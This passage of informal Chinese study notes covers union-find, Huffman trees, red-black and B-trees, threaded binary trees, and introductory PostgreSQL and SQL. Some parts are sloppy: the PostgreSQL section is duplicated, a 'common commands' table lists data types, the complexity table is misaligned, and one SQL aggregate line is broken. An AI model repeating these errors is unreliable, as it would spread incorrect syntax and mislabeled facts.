<li>查找（Find）：确定某个元素处于哪个子集；</li>
<li>合并（Union）：将两个子集合并成一个集合。</li>
</ul>
<p>他被放在树目录中，因为他实际上是一个树形的数据结构。集合就是一棵树，我们的Find操作就是想知道两个节点是否在一个树中，Union操作就是想合并两棵树，不过我们对树的具体结构是不关心的。</p>
<h2 id="实现-1"><a class="header" href="#实现-1">实现</a></h2>
<p>通常我们使用一个数组来存储，<code>int father[]</code>记录一个节点的父节点。如果是根结点的话<code>x == father[x]</code>。</p>
<h3 id="find"><a class="header" href="#find">Find</a></h3>
<p>简单的查找</p>
<pre><code class="language-c">int find(int x) {
  // 寻找x的祖先
  if (father[x] == x)  // 如果 x 是祖先则返回
    return x;
  else
    return find(father[x]);  // 如果不是则 x 的爸爸问 x 的爷爷
}
</code></pre>
<p>路径压缩查找法，因为我们不关心树的具体结构，所以对于<code>grandfather -&gt; father -&gt; me -&gt; son</code>，其实完全可以合并成<code>grandfather -&gt; (father, me, son)</code>。</p>
<pre><code class="language-c">int find(int x) {
  if (x != father[x])         // x 不是自身的父亲，即 x 不是该集合的代表
    father[x] = find(father[x]);  // 查找 x 的祖先直到找到代表，于是顺手路径压缩
  return father[x];
}
</code></pre>
<h3 id="union"><a class="header" href="#union">Union</a></h3>
<p>简单的合并</p>
<pre><code class="language-c">void unionSet(int x, int y) {
  // x 与 y 所在家族合并
  x = find(x);
  y = find(y);
  father[x] = y;  // 把 x 的祖先变成 y 的祖先的儿子
}
</code></pre>
<p>启发式合并，将小的树合并到大的树中，减小之后路径压缩的代价。</p>
<pre><code class="language-cpp">std::vector&lt;int&gt; size(N, 1);  // 记录并初始化子树的大小为 1

void unionSet(int x, int y) {
  int xx = find(x), yy = find(y);
  if (xx == yy) return;
  if (size[xx] &gt; size[yy])  // 保证小的合到大的里
    swap(xx, yy);
  father[xx] = yy;
  size[yy] += size[xx];
}
</code></pre>
<h2 id="复杂度"><a class="header" href="#复杂度">复杂度</a></h2>
<p>如果使用路径压缩和启发式合并的话，复杂度是非常小接近于常数的。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="huffman-tree"><a class="header" href="#huffman-tree">Huffman Tree</a></h1>
<p>Huffman Tree被广泛的用于信息的无损压缩中。</p>
<p><strong>霍夫曼树Huffman Tree</strong>又称最优二叉树，是一种带权路径长度最短的二叉树。所谓树的带权路径长度，就是树中所有的叶结点的权值乘上其到根结点的路径长度（若根结点为0层，叶结点到根结点的路径长度为叶结点的层数）。树的路径长度是从树根到每一结点的路径长度之和，记为$WPL=（W_1<em>L_1+W_2</em>L_2+W_3<em>L_3+...+W_n</em>L_n$），N个权值$W_i(i=1,2,...n)$构成一棵有N个叶结点的二叉树，相应的叶结点的路径长度为$L_i(i=1,2,...n)$。可以证明霍夫曼树的$WPL$是最小的。</p>
<p>进行霍夫曼编码前，我们先创建一个霍夫曼树。下面是例子，假设这些字母出现的频率如下：</p>
<p><img src="Basic/DataStructure/Tree/../images/image-20210518121023302.png" alt="image-20210518121023302" /></p>
<p>构建Huffman Tree的过程如下：</p>
<ol>
<li>
<p>一开始的<strong>minHeap</strong>中保存着每一个字母的出现频率。</p>
</li>
<li>
<p>那么我们每次<strong>pop</strong>两个频率最小的（比如第一次是2和3），组合在一起（比如第一次是5）之后<strong>push</strong>回<strong>minHeap</strong>。pop出的两个元素的parent就是push进去的元素(5-&gt;2,3)。</p>
</li>
<li>
<p>重复2操作直到<strong>minHeap</strong>中只剩下一个元素（就是25）。剩下的这个元素就是root。至此Huffman Tree的构造完成。</p>
</li>
<li>
<p>我们给每个节点的两条边分配0/1，从root到leaf经过的边构成的编码就是Huffman code。</p>
</li>
</ol>
<p><img src="Basic/DataStructure/Tree/../images/Huffman_algorithm.gif" alt="Huffman_algorithm" /></p>
<p>No code is prefix of another, 否则我们无法解压缩字符串. Huffman tree 通过让字符都是leaf node保证这一点。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="红黑树-b树-b树"><a class="header" href="#红黑树-b树-b树">红黑树 B树 B+树</a></h1>
<p>根据对<strong>平衡</strong>的不同定义，我们还有红黑树和B+树。只能说他们又难又强大。他们的目标都是加速搜索，而且B+树更进一步对大数据的搜索更友好，可以说是面向计算机体系结构的数据结构了。</p>
<h2 id="red-black-tree"><a class="header" href="#red-black-tree">Red-Black Tree</a></h2>
<p>红黑树节点的数据结构：<img src="Basic/DataStructure/Tree/../images/image-20210509113119326.png" alt="image-20210509113119326" />
红黑树的定义：</p>
<blockquote>
<p>A red-black tree is a binary search tree that satisfies the following red-black properties:
(1) Every node is either red or black. （染色）
(2) The root is black.
(3) Every leaf (NIL) is black.   （注意这里的leaf指的是空节点，或者说是NIL节点）
(4) <strong>If a node is red, then both its children are black.</strong> （换句话说，不会有两个连续的红色节点）
(5) For each node, all simple paths from the node to descendant leaves contain the <strong>same number of black nodes.</strong>(平衡条件)
在这些条件保证下：</p>
</blockquote>
<ol>
<li>一棵有n个内部节点的红黑树的高度至多为$2 log(n+1)$。</li>
<li>红黑树能保证在最坏情况下，执行所有操作的时间复杂度都是O(lg N)</li>
</ol>
<ul>
<li>internal node: 可以认为是非NULL结点。</li>
<li>external node: NULL结点。</li>
<li>black height: 从节点x出发（不含）到一个叶节点的任意一条简单路径上的黑色节点个数，记为$bh(x)$</li>
</ul>
<p>相比于AVL Tree，红黑树插入和删除的旋转操作更少，不过没有AVL Tree平衡。所以对于<strong>插入删除频繁</strong>的场景可以用红黑树，</p>
<h3 id="复杂度分析-5"><a class="header" href="#复杂度分析-5">复杂度分析</a></h3>
<div class="table-wrapper"><table><thead><tr><th>算法</th><th><strong>平均</strong></th><th><strong>最差</strong></th></tr></thead><tbody>
<tr><td>1.</td><td>Search</td><td>O(log n)</td></tr>
<tr><td>2.</td><td>Insert</td><td>O(log n)</td></tr>
<tr><td>3.</td><td>Delete</td><td>O(log n)</td></tr>
</tbody></table>
</div>
<p>考试常考的是2-3-4 Tree（也就是M=4的B+ Tree）或2-3 Tree（M=3），虽然实际用途似乎并不会这么小。</p>
<pre><code class="language-c">Btree  Insert ( ElementType X,  Btree T ) 
{ 
	Search from root to leaf for X and find the proper leaf node;
	Insert X;
	while ( this node has M+1 keys ) {
    		split it into 2 nodes with (M+1)/2 and (M+1)/2  keys, respectively;
    		if (this node is the root)
        		create a new root with two children;
    		check its parent;
	}
} 
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="threaded-binary-tree"><a class="header" href="#threaded-binary-tree">Threaded Binary Tree</a></h1>
<p>二叉树添加了直接指向节点的前驱和后继的指针的二叉树称为线索二叉树。所有<strong>原本为空的右(孩子)指针改为指向该节点在中序序列中的后继，所有原本为空的左(孩子)指针改为指向该节点的中序序列的前驱</strong>。他让我们可以线性的遍历二叉树。</p>
<p><img src="Basic/DataStructure/Tree/../images/1024px-Threaded_tree.svg.png" alt="img" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="database-1"><a class="header" href="#database-1">Database</a></h1>
<p>数据库学习的一点记录，学的不太好。我学的最差的一门专业课www</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="database-object-based_databases"><a class="header" href="#database-object-based_databases">Database-Object-Based_Databases</a></h1>
<p>上层O，下层R</p>
<p>复杂类型：</p>
<p><strong>SQL:1999之后的新特性，可能不被数据库软件支持；就算支持，不同数据库的语法也不尽相同。</strong></p>
<p>Multivalue set 和 array</p>
<p>unnest把集合解开</p>
<p>collect </p>
<pre><code>create type Vehicle(
	vehicle id integer,
    license number char(15),
    manufacturer char(30),
    model char(30),
    purchase date MyDate,
    color Color
    );

create table vehicle of type Vehicle;
create table truck
	(cargo capacity integer)
	under vehicle;

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="database-postgresql"><a class="header" href="#database-postgresql">Database-PostgreSQL</a></h1>
<p><a href="http://www.postgres.cn/docs/12/index.html">中文手册</a></p>
<h2 id="软件简介"><a class="header" href="#软件简介">软件简介</a></h2>
<p>在数据库术语里，PostgreSQL使用一种客户端/服务器的模型。一次PostgreSQL会话由下列相关的进程（程序）组成：</p>
<ul>
<li>一个服务器进程，它管理数据库文件、接受来自客户端应用与数据库的联接并且代表客户端在数据库上执行操作。 该<strong>数据库服务器程序叫做postgres</strong>。</li>
<li>那些需要执行数据库操作的用户的客户端（前端）应用。 客户端应用可能本身就是多种多样的：可以是一个面向文本的工具， 也可以是一个图形界面的应用，或者是一个通过访问数据库来显示网页的网页服务器，或者是一个特制的数据库管理工具。 一些客户端应用是和 PostgreSQL发布一起提供的，但绝大部分是用户开发的。</li>
</ul>
<p>一旦你创建了数据库，你就可以通过以下方式访问它：</p>
<ul>
<li>运行PostgreSQL的<strong>交互式客户端终端程序，它被称为psql</strong>， 它允许你交互地输入、编辑和执行SQL命令。  <code>psql [选项]... [数据库名称 [用户名称]]</code></li>
<li>使用一种已有的图形化前端工具，比如pgAdmin或者带ODBC或JDBC支持的办公套件来创建和管理数据库。这种方法在这份教程中没有介绍。</li>
<li>用多种绑定发行的语言中的一种写一个自定义的应用。<code>postgresql://username:password@hostname/database</code></li>
</ul>
<h3 id="psql软件使用"><a class="header" href="#psql软件使用">PSQL软件使用</a></h3>
<pre><code>sudo -i -u postgres					#登录postgres管理员用户
然后再输入 psql进入					#打开软件
可以直接用默认用户postgres登录，密码××××××××××
</code></pre>
<p>PSQL的一些常用命令：
| 命令            | 含义           |
|  | -- |  |  |
| <code>bigint</code>                                      | <code>int8</code>                       | 有符号的8字节整数                             |
| <code>bigserial</code>                                   | <code>serial8</code>                    | 自动增长的8字节整数                           |
| <code>bit [ (*</code>n<code>*) ]</code>                             |                              | 定长位串                                      |
| <code>bit varying [ (*</code>n<code>*) ]</code>                     | <code>varbit [ (*</code>n<code>*) ]</code>         | 变长位串                                      |
| <code>boolean</code>                                     | <code>bool</code>                       | 逻辑布尔值（真/假）                           |
| <code>box</code>                                         |                              | 平面上的普通方框                              |
| <code>bytea</code>                                       |                              | 二进制数据（“字节数组”）                      |
| <code>character [ (*</code>n<code>*) ]</code>                       | <code>char [ (*</code>n<code>*) ]</code>           | 定长字符串                                    |
| <code>character varying [ (*</code>n<code>*) ]</code>               | <code>varchar [ (*</code>n<code>*) ]</code>        | 变长字符串                                    |
| <code>cidr</code>                                        |                              | IPv4或IPv6网络地址                            |
| <code>circle</code>                                      |                              | 平面上的圆                                    |
| <code>date</code>                                        |                              | 日历日期（年、月、日）                        |
| <code>double precision</code>                            | <code>float8</code>                     | 双精度浮点数（8字节）                         |
| <code>inet</code>                                        |                              | IPv4或IPv6主机地址                            |
| <code>integer</code>                                     | <code>int</code>, <code>int4</code>                | 有符号4字节整数                               |
| <code>interval [ *</code>fields<code>* ] [ (*</code>p<code>*) ]</code>         |                              | 时间段                                        |
| <code>json</code>                                        |                              | 文本 JSON 数据                                |
| <code>jsonb</code>                                       |                              | 二进制 JSON 数据，已分解                      |
| <code>line</code>                                        |                              | 平面上的无限长的线                            |
| <code>lseg</code>                                        |                              | 平面上的线段                                  |
| <code>macaddr</code>                                     |                              | MAC（Media Access Control）地址               |
| <code>macaddr8</code>                                    |                              | MAC（Media Access Control）地址（EUI-64格式） |
| <code>money</code>                                       |                              | 货币数量                                      |
| <code>numeric [ (*</code>p<code>*, *</code>s<code>*) ]</code>                  | <code>decimal [ (*</code>p<code>*, *</code>s<code>*) ]</code> | 可选择精度的精确数字                          |
| <code>path</code>                                        |                              | 平面上的几何路径                              |
| <code>pg_lsn</code>                                      |                              | PostgreSQL日志序列号                          |
| <code>point</code>                                       |                              | 平面上的几何点                                |
| <code>polygon</code>                                     |                              | 平面上的封闭几何路径                          |
| <code>real</code>                                        | <code>float4</code>                     | 单精度浮点数（4字节）                         |
| <code>smallint</code>                                    | <code>int2</code>                       | 有符号2字节整数                               |
| <code>smallserial</code>                                 | <code>serial2</code>                    | 自动增长的2字节整数                           |
| <code>serial</code>                                      | <code>serial4</code>                    | 自动增长的4字节整数                           |
| <code>text</code>                                        |                              | 变长字符串                                    |
| <code>time [ (*</code>p<code>*) ] [ without time zone ]</code>      |                              | 一天中的时间（无时区）                        |
| <code>time [ (*</code>p<code>*) ] with time zone</code>             | <code>timetz</code>                     | 一天中的时间，包括时区                        |
| <code>timestamp [ (*</code>p<code>*) ] [ without time zone ]</code> |                              | 日期和时间（无时区）                          |
| <code>timestamp [ (*</code>p<code>*) ] with time zone</code>        | <code>timestamptz</code>                | 日期和时间，包括时区                          |
| <code>tsquery</code>                                     |                              | 文本搜索查询                                  |
| <code>tsvector</code>                                    |                              | 文本搜索文档                                  |
| <code>txid_snapshot</code>                               |                              | 用户级别事务ID快照                            |
| <code>uuid</code>                                        |                              | 通用唯一标识码                                |
| <code>xml</code>                                         |                              | XML数据                                       |</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="database-postgresql-1"><a class="header" href="#database-postgresql-1">Database-PostgreSQL</a></h1>
<p><a href="http://www.postgres.cn/docs/12/index.html">中文手册</a></p>
<h2 id="软件简介-1"><a class="header" href="#软件简介-1">软件简介</a></h2>
<p>在数据库术语里，PostgreSQL使用一种客户端/服务器的模型。一次PostgreSQL会话由下列相关的进程（程序）组成：</p>
<ul>
<li>一个服务器进程，它管理数据库文件、接受来自客户端应用与数据库的联接并且代表客户端在数据库上执行操作。 该<strong>数据库服务器程序叫做postgres</strong>。</li>
<li>那些需要执行数据库操作的用户的客户端（前端）应用。 客户端应用可能本身就是多种多样的：可以是一个面向文本的工具， 也可以是一个图形界面的应用，或者是一个通过访问数据库来显示网页的网页服务器，或者是一个特制的数据库管理工具。 一些客户端应用是和 PostgreSQL发布一起提供的，但绝大部分是用户开发的。</li>
</ul>
<p>一旦你创建了数据库，你就可以通过以下方式访问它：</p>
<ul>
<li>运行PostgreSQL的<strong>交互式客户端终端程序，它被称为psql</strong>， 它允许你交互地输入、编辑和执行SQL命令。  <code>psql [选项]... [数据库名称 [用户名称]]</code></li>
<li>使用一种已有的图形化前端工具，比如pgAdmin或者带ODBC或JDBC支持的办公套件来创建和管理数据库。这种方法在这份教程中没有介绍。</li>
<li>用多种绑定发行的语言中的一种写一个自定义的应用。<code>postgresql://username:password@hostname/database</code></li>
</ul>
<h3 id="psql软件使用-1"><a class="header" href="#psql软件使用-1">PSQL软件使用</a></h3>
<pre><code>sudo -i -u postgres					#登录postgres管理员用户
然后再输入 psql进入					#打开软件
可以直接用默认用户postgres登录，密码××××××××××
</code></pre>
<p>PSQL的一些常用命令：
| 命令         | le   | 含义           |
|-  | - | - |
| <code>bigint</code>                                      | <code>int8</code>                       | 有符号的8字节整数                             |
| <code>bigserial</code>                                   | <code>serial8</code>                    | 自动增长的8字节整数                           |
| <code>bit [ (*</code>n<code>*) ]</code>                             |                              | 定长位串                                      |
| <code>bit varying [ (*</code>n<code>*) ]</code>                     | <code>varbit [ (*</code>n<code>*) ]</code>         | 变长位串                                      |
| <code>boolean</code>                                     | <code>bool</code>                       | 逻辑布尔值（真/假）                           |
| <code>box</code>                                         |                              | 平面上的普通方框                              |
| <code>bytea</code>                                       |                              | 二进制数据（“字节数组”）                      |
| <code>character [ (*</code>n<code>*) ]</code>                       | <code>char [ (*</code>n<code>*) ]</code>           | 定长字符串                                    |
| <code>character varying [ (*</code>n<code>*) ]</code>               | <code>varchar [ (*</code>n<code>*) ]</code>        | 变长字符串                                    |
| <code>cidr</code>                                        |                              | IPv4或IPv6网络地址                            |
| <code>circle</code>                                      |                              | 平面上的圆                                    |
| <code>date</code>                                        |                              | 日历日期（年、月、日）                        |
| <code>double precision</code>                            | <code>float8</code>                     | 双精度浮点数（8字节）                         |
| <code>inet</code>                                        |                              | IPv4或IPv6主机地址                            |
| <code>integer</code>                                     | <code>int</code>, <code>int4</code>                | 有符号4字节整数                               |
| <code>interval [ *</code>fields<code>* ] [ (*</code>p<code>*) ]</code>         |                              | 时间段                                        |
| <code>json</code>                                        |                              | 文本 JSON 数据                                |
| <code>jsonb</code>                                       |                              | 二进制 JSON 数据，已分解                      |
| <code>line</code>                                        |                              | 平面上的无限长的线                            |
| <code>lseg</code>                                        |                              | 平面上的线段                                  |
| <code>macaddr</code>                                     |                              | MAC（Media Access Control）地址               |
| <code>macaddr8</code>                                    |                              | MAC（Media Access Control）地址（EUI-64格式） |
| <code>money</code>                                       |                              | 货币数量                                      |
| <code>numeric [ (*</code>p<code>*, *</code>s<code>*) ]</code>                  | <code>decimal [ (*</code>p<code>*, *</code>s<code>*) ]</code> | 可选择精度的精确数字                          |
| <code>path</code>                                        |                              | 平面上的几何路径                              |
| <code>pg_lsn</code>                                      |                              | PostgreSQL日志序列号                          |
| <code>point</code>                                       |                              | 平面上的几何点                                |
| <code>polygon</code>                                     |                              | 平面上的封闭几何路径                          |
| <code>real</code>                                        | <code>float4</code>                     | 单精度浮点数（4字节）                         |
| <code>smallint</code>                                    | <code>int2</code>                       | 有符号2字节整数                               |
| <code>smallserial</code>                                 | <code>serial2</code>                    | 自动增长的2字节整数                           |
| <code>serial</code>                                      | <code>serial4</code>                    | 自动增长的4字节整数                           |
| <code>text</code>                                        |                              | 变长字符串                                    |
| <code>time [ (*</code>p<code>*) ] [ without time zone ]</code>      |                              | 一天中的时间（无时区）                        |
| <code>time [ (*</code>p<code>*) ] with time zone</code>             | <code>timetz</code>                     | 一天中的时间，包括时区                        |
| <code>timestamp [ (*</code>p<code>*) ] [ without time zone ]</code> |                              | 日期和时间（无时区）                          |
| <code>timestamp [ (*</code>p<code>*) ] with time zone</code>        | <code>timestamptz</code>                | 日期和时间，包括时区                          |
| <code>tsquery</code>                                     |                              | 文本搜索查询                                  |
| <code>tsvector</code>                                    |                              | 文本搜索文档                                  |
| <code>txid_snapshot</code>                               |                              | 用户级别事务ID快照                            |
| <code>uuid</code>                                        |                              | 通用唯一标识码                                |
| <code>xml</code>                                         |                              | XML数据                                       |</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="基础sql"><a class="header" href="#基础sql">基础SQL</a></h1>
<h2 id="一一些概念"><a class="header" href="#一一些概念">一、一些概念</a></h2>
<p>行称为<strong>记录 record</strong>，也可以叫做<strong>元组 tuple</strong>。列称为<strong>字段 field</strong>，也可以叫做<strong>属性 attribute</strong>。</p>
<p>一张<strong>表 table</strong>也被称为 <strong>关系relation</strong>。是元组的集合。</p>
<p>码：</p>
<ul>
<li>superkey: 是一个或多个attribute的集合，可以让我们在一个relation中唯一的标识一个tuple。</li>
<li>candidate key: 最小的superkey，准确的说是candidate key是superkey但是他的任何一个真子集都不是superkey。他不一定是唯一的。</li>
<li>primary key: 被数据设计者选中的用来在一个relation中区分不同tuple的candidate key。</li>
</ul>
<h2 id="二数据类型和约束条件"><a class="header" href="#二数据类型和约束条件">二、数据类型和约束条件</a></h2>
<ul>
<li>数字类型：
<ul>
<li>INTEGER</li>
</ul>
</li>
<li>字符串：
<ul>
<li>CHAR</li>
<li>VARCHAR</li>
</ul>
</li>
<li>时间日期：
<ul>
<li>DATE</li>
</ul>
</li>
</ul>
<p>约束条件，常见的有：</p>
<ul>
<li>NOT NULL 非空，必须输入</li>
<li>primary key		主键，唯一索引 </li>
<li>default 0			默认值</li>
</ul>
<h2 id="三sql命令"><a class="header" href="#三sql命令">三、SQL命令</a></h2>
<p>最常用的命令：<code>select 你要的字段 from 数据表 where 行筛选条件 group by 分组字段 having 组筛选条件 order by 排序字段</code>
执行顺序：<code>From-&gt;where-&gt;group(aggregate)-&gt;having-&gt;select-&gt;order by</code></p>
<h3 id="ddldata-definition-language"><a class="header" href="#ddldata-definition-language">DDL(data definition language)</a></h3>
<h4 id="create"><a class="header" href="#create">CREATE</a></h4>
<p>创建数据库：</p>
<pre><code class="language-sql">CREATE database shop;	
</code></pre>
<p>创建数据表</p>
<pre><code class="language-sql">CREATE table 表名（
字段名1 类型 约束条件，
字段名2 类型 约束条件，
字段名3 类型 约束条件，
该表的约束条件1，该表的约束条件2，该表的约束条件3）;

CREATE table food (
food_name VARCHAR(20) ,
);
</code></pre>
<h4 id="drop"><a class="header" href="#drop">DROP</a></h4>
<p>删除数据库：</p>
<pre><code class="language-sql">DROP database shop;
</code></pre>
<p><strong>删除数据表：</strong></p>
<pre><code class="language-sql">DROP table food;
</code></pre>
<h4 id="alter"><a class="header" href="#alter">ALTER</a></h4>
<p><strong>更新数据表：</strong>
其实alter开头的指令非常多。</p>
<pre><code class="language-sql">ALTER table food add column birthdate DATE;				--添加列
ALTER table math_teacher drop column birthdate; 		--删除列
ALTER table math_teacher rename to english_teacher;		--重命名表
ALTER table branch add primary key (branch_name);       --添加主键约束
ALTER table card add check(type in ('T','G','U','O','K'));      --添加检查check
ALTER table card drop constraint card_type_check ;          --删除检查check
</code></pre>
<h3 id="dmldata-manipulation-language"><a class="header" href="#dmldata-manipulation-language">DML(Data Manipulation language)</a></h3>
<h4 id="select"><a class="header" href="#select">SELECT</a></h4>
<p>query，查询数据表中的数据，最重要的语句。SELECT语句。</p>
<pre><code class="language-sql">select * from math_t;							--从表中查询所有字段
select A,B,C from TableName;					--从表中查询A、B、C字段
select birth_date as d from Table;				--设置别名
select birth_date as &quot;birthday&quot; from Table;		--设置别名，中文要用双引号括起来
select 0 as &quot;chufen&quot;,name as &quot;name&quot; from math_t;--添加常数字段
select distinct birth_date from math_t;			--去重,重复的记录只显示一次,distinct应该在第一个字段之前
</code></pre>
<h4 id="where"><a class="header" href="#where">WHERE</a></h4>
<p>where的常见用法。无论如何，WHERE里不可能出现聚合函数。</p>
<pre><code class="language-sql">select * from math_t where birth_date&gt;'2001-10-01';	--where后面加上筛选条件
select bno,count(*) into book_count from borrow where borrow_date between '2019-1-1' and '2019-12-21' group by bno;     --属于某个时间段内
select number+1 from math_t;						--算数运算符+-*/()
select * from math_t where name&lt;&gt;'';	        --不等号
select bno,count(*) as bor from borrow where return_date is null group by bno;select * from math_t where number is not null;
--is not null表示不是NULL,is null表示是null
--null的真值是不确定,SQL的真值有三个(真的SB),短路原则适用.
</code></pre>
<p>比较运算符有<code>&lt;&gt;,=,&gt;,&lt;,&gt;=,&lt;=</code>
字符串按照字典序进行比较
时间可以比较大小，Between A and B
逻辑运算符<code>not and or ()</code>
要注意的是，SQL的真值中还有一个叫不确定：
<img src="Basic/Database/../images/1615554797028.jpg" alt="" /></p>
<h4 id="insert"><a class="header" href="#insert">Insert</a></h4>
<pre><code class="language-sql">insert into TableName values (‘Ji Gaoqiang’,’2001-10-07’);			--全部字段添加值
insert into TableName values (‘Ji Gaoqiang’,’2001-10-07’,default);	--显式添加默认值
insert into TableName (list) values (value);						--部分字段添加值
insert INTO tableA select * from tableB;							--表的复制,不用
</code></pre>
<h3 id="dcldata-control-language"><a class="header" href="#dcldata-control-language">DCL(Data control language)</a></h3>
<h4 id="delete"><a class="header" href="#delete">DELETE</a></h4>
<pre><code class="language-sql">delete from TableName;							--删除表中的全部数据
delete from math_t where birth_date is null;	--根据条件删除表中的数据
</code></pre>
<h4 id="update"><a class="header" href="#update">UPDATE</a></h4>
<pre><code class="language-sql">update TableName set number = 1;					--全部数据的更新
update TableName set number = 1 where name=’Ji GQ’;	--指定数据的更新
</code></pre>
<h2 id="四聚合函数"><a class="header" href="#四聚合函数">四、聚合函数</a></h2>
<p>count是唯一一个把NULL算进去的聚合函数。</p>
<pre><code class="language-sql">select count(*) from math_t;				--count()数记录数,*包括NULL
select count(number),count(birth from math_t from math_t;	--count()数记录数,其他不包括NULL
select sum(number) from math_t;				--一列的和,忽略NULL
select sum(distinct number) from math_t; 	--一列去重之后的和
select AVG(number) from math_t;				--一列的平均值,忽略NULL
select max(number) from math_t;				--一列的最大值,忽略NULL
select min(number) from math_t;				--一列的最小值,忽略NULL
</code></pre>
<h3 id="distinct"><a class="header" href="#distinct">DISTINCT</a></h3>
<p>在聚合函数的参数中使用DISTINCT，可以删除重复数据。</p>
<h3 id="group-by"><a class="header" href="#group-by">GROUP BY</a></h3>
<p>GROUP BY可以把表再进行切分。select字句中只能出现<strong>聚合函数、或者GROUP BY中指定的列名，常数</strong>。另外不要再GROUP BY字句中使用别名。</p>
<pre><code class="language-sql">select birth_date,count(*) from math_t group by birth_date ;
-- select子句只能出现Group By 的依据(聚合键)/聚合函数/常数,写别的字段名会出错
-- 去重切割,所有的NULL也会被聚合到一起
-- Group by的分组结果是无序的
select birth_date,count(*) from math_t group by birth_date having count(*)=1;
-- having对聚合结果进行筛选,where不行
-- having子句里只能出现 常数/聚合函数/聚合键
</code></pre>
<h3 id="order-by"><a class="header" href="#order-by">ORDER BY</a></h3>
<p>使用order by对查询结果进行排序。默认升序，如果需要降序排序，在最后加上desc。</p>
<pre><code class="language-sql">select * from math_t order BY birth_date ;
-- 按照count关键字生序排序,如果想降序后面跟desc. 有NULL的话会在开头或末尾
select number,count(*) from math_t group by number order by count(*);
-- 多关键字,优先左边的排序; 可以跟聚合函数排序
</code></pre>
<h2 id="五视图-子查询-标量子查询"><a class="header" href="#五视图-子查询-标量子查询">五、视图 子查询 标量子查询</a></h2>
<p>视图存储的是select语句而不是表，虽然看起来就是表，有点脚本的味道。
这样就可以不让用户直接操作表了，提高了安全性。还可以定制用户想得到的表，提高易用性。
存储View还有一个特点，就是如果定义View的实际Relation发生了改变，View也会跟着修改。这样的视图叫做materialized view
对视图进行的SELECT查询操作和表用起来差不多，但是在插入和删除的时候就感觉有点奇怪了。因为我们要把对View的修改翻译成对数据库中实际Relation的修改。<strong>一般情况下</strong>我们不能修改视图。</p>
<pre><code class="language-sql">create view 视图名称 (视图列名1 ,视图列名2,...) as
select 语句

create view viewexample (&quot;name&quot;,&quot;birth&quot;)	--视图列名
as											--不能省略
select name,number from math_t ;			--创建视图
--然后就可以用 select * form viewexample 查看视图了
--创建视图的select语句不能有order by,因为视图和表一样,是无序的
drop view viewexample ;						--删除视图
</code></pre>
<p>子查询的特点概括起来就是一张一次性视图。视图并不是用来保存数据的，而是通过保存读取数据的SELECT 语句的方法来为用户提供便利。类似的，子查询就是将用来定义视图的SELECT语句需要一张表的地方。</p>
<p>进一步的，来自外层查询的相关名称可以用在<strong>WHERE字句的子查询</strong>中。使用了来自外层查询相关名称的子查询被称为<strong>相关子查询correlated subquery</strong>。</p>
<ul>
<li>集合成员资格 ：连接词<strong>IN</strong>测试元组是否是集合中的成员。类似的还有NOT IN。<code>XXX IN 子查询</code></li>
<li>集合的比较： <strong>SOME</strong>可以表示“集合中的某个”的意思。 <code>XXX IN 子查询</code>等价于<code>XXX = SOME(子查询)</code>。<code>XXX&gt;SOME(子查询)</code>表示XXX比（至少）集合中的某个要大。类似的还有<strong>ALL</strong>表示“集合中的每个”的意思。<code>XXX NOT IN(子查询)</code>等价于<code>XXX &lt;&gt; ALL(子查询)</code>，<code>XXX&gt;ALL(子查询)</code>表示XXX比集合中的每个都大。</li>
<li>空关系测试：<code>EXIST(子查询)</code>在子查询非空的时候，<strong>EXIST</strong>结构返回True。</li>
<li>重复元组存在性测试：<code>UNIQUE(子查询)</code>如果子查询中没有重复的元素，<strong>UNIQUE</strong>结构返回TRUE。</li>
<li>from子句中的子查询</li>
<li>with子句：提供了定义临时关系的办法。<code>WITH 临时表名 (列名1,列名2) AS (子查询)</code>，这句写在最前面，后面的select语句就可以用这个临时表了。</li>
</ul>
<pre><code class="language-sql">SELECT product_type, cnt_product
FROM ( SELECT product_type, COUNT(*) AS cnt_product
FROM Product
GROUP BY product_type ) AS ProductSum;
</code></pre>
<p>返回的值只有一行一列(就是一个值啦)就是<strong>标量子查询</strong>。标量子查询的书写位置并不仅仅局限于 WHERE 子句中，通常任何可以使用单一值的位置都可以使用。也就是说，能够使用常数或者列名的地方，无论是 SELECT 子句、GROUP BY 子句、HAVING 子句，还是ORDER BY 子句，几乎所有的地方都可以使用。</p>
<pre><code class="language-sql">select * from math_t where number &gt; (select avg(number) from math_t );
--要注意where的条件中不能出现聚合函数,划线部分为标量子查询.
--标量子查询在需要一个值的地方几乎都能使用
</code></pre>
<h2 id="六集合运算"><a class="header" href="#六集合运算">六、集合运算</a></h2>
<p>集合运算要求列数一致,每一列的类型一致。别的操作往往默认保留重复，但是<strong>集合运算必须加上关键词ALL才会保留重复</strong>。</p>
<pre><code class="language-sql">select * from math_bak 
union all						--并集,允许重复的项
select * from math_t;			--要求两个表/视图中列的类型一致,字段名倒不要求

select * from math_bak 
union 							--并集,合并重复的项
select * from math_t			--要求两个表/视图中列的类型一致,字段名倒不要求
order by number;				--排序只能在最后出现

select * from math_bak 
intersect 						--交集,前后两个表重复的部分,同样的如果保留重复行加ALL
select * from math_t			--要求两个表/视图中列的类型一致,字段名倒不要求
order by number;				--排序只能在最后出现

select * from math_bak 
except 							--差集
select * from math_t			--要求两个表/视图中列的类型一致,字段名倒不要求
order by number;				--排序只能在最后出现
</code></pre>
<h2 id="七连接-join"><a class="header" href="#七连接-join">七、连接 Join</a></h2>
<p>集合运算是添加或减少行,联结则是改变列。</p>
<p>inner：左边和右边无法匹配的记录，都不会保留。一般来说这样的语句可以简单的用select where代替。
full outer：左边和右边无法匹配的记录，都会保留。那些无法匹配的记录的值会用null填充。
left outer：左边无法匹配的记录会保留。那些无法匹配的记录的值会用null填充。
写法（inner和outer是可以省略的，不影响含义）：</p>
<ul>
<li>自然连接<code>R natural {inner join,left outer join,right outer join,full outer join}  S using &lt;A1,A2...&gt;</code></li>
<li>非自然连接<code>R {inner join,left outer join,right outer join,full outer join} S on {condition} using &lt;A1,A2...&gt;</code></li>
</ul>
<pre><code class="language-sql">select I.id, T.name, T.birth_date 
from math_i as I inner join math_t as T		--inner join内联结,用别名书写方便
on I.number = T.number;					
--设置联结键,不一定是主键.其实只要是逻辑表达式就可以,但是一般用等号居多.只要逻辑表达式的结果为True就会联结,不一定是一对一

select I.id, T.name, T.birth_date 
from math_i as I left outer join math_t as t			
